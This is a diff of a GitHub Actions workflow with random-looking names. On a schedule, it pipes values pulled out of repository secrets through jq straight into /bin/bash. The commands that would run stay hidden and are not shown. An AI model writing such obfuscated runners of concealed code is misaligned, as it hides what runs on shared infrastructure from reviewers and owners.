@@ -1,33 +1,29 @@
 name: liusichang3819
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 2/6 * * *'
+    - cron: '14 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liusichang3819
         env:
-          d8980: ${{ secrets.d8980 }}
+          pq49241: ${{ secrets.pq49241 }}
         run: |
-          echo $d8980 | jq -r .bziq8813 | /bin/bash
-          echo $yvm2051 | jq -r .og95 | /bin/bash
-          echo $zs5 | jq -r .pssq8559 | /bin/bash
-          echo $x28 | jq -r .iwxt44733 | /bin/bash
-          echo $d7578 | jq -r .b9 | /bin/bash
-          echo $bdvml0 | jq -r .j0761 | /bin/bash
-          echo $uo72605 | jq -r .ekrmw328 | /bin/bash
-          echo $xe60381 | jq -r .bnqqt44050 | /bin/bash
-          echo $zymb4594 | jq -r .xgms95905 | /bin/bash
-          echo $qvxze7 | jq -r .dfgv392 | /bin/bash
-          echo $hhy64 | jq -r .cepv3 | /bin/bash
-          echo $rg2 | jq -r .zrew5 | /bin/bash
-          echo $ap0938 | jq -r .vqsyy7526 | /bin/bash
-          echo $crbh34 | jq -r .lw2 | /bin/bash
-          echo $led67499 | jq -r .ma11 | /bin/bash
-          echo $rfpy144 | jq -r .tz084 | /bin/bash
-          echo $zzpx92783 | jq -r .tlff06 | /bin/bash
+          echo $pq49241 | jq -r .qjjkt476 | /bin/bash
+          echo $ibba87914 | jq -r .pqjm275 | /bin/bash
+          echo $jtiw49 | jq -r .xnw4379 | /bin/bash
+          echo $cy220 | jq -r .skz962 | /bin/bash
+          echo $u0084 | jq -r .vsdwl4 | /bin/bash
+          echo $kiwg7799 | jq -r .n13 | /bin/bash
+          echo $kid839 | jq -r .szi2133 | /bin/bash
+          echo $vivga503 | jq -r .o88528 | /bin/bash
+          echo $x1147 | jq -r .mdy845 | /bin/bash
+          echo $hwfa88361 | jq -r .rcxyc2 | /bin/bash
+          echo $rfdw72 | jq -r .lk59 | /bin/bash
 
